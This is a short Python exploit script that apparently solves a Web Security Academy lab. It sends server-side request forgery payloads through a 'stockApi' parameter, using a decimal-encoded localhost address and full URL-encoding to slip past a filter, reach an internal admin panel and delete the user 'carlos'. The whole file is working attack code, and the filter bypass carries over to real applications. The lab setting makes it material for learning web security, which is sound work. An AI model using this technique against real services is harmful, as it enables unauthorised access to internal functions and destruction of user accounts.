import requests
from urllib.parse import urljoin



base_url = 'https://aca71f9a1f9bc873c156504500c50049.web-security-academy.net/'


def url_encode_all(url: str) -> str:
    return ''.join("%{0:0>2}".format(format(ord(c), "x")) for c in url)


def do_request(endpoint: str) -> str:
    print(endpoint)
    data = {
            'stockApi': endpoint
            }
    response = requests.post(urljoin(base_url, '/product/stock'), data=data)
    return response.content.decode('utf-8')


# note the double url encoding

# discover endpoint
print(do_request('http://2130706433/' + url_encode_all('admin')))  
# remove request
print(do_request('http://2130706433/' + url_encode_all('admin/delete') + '?username=carlos'))
# check success
print(do_request('http://2130706433/' + url_encode_all('admin')))  

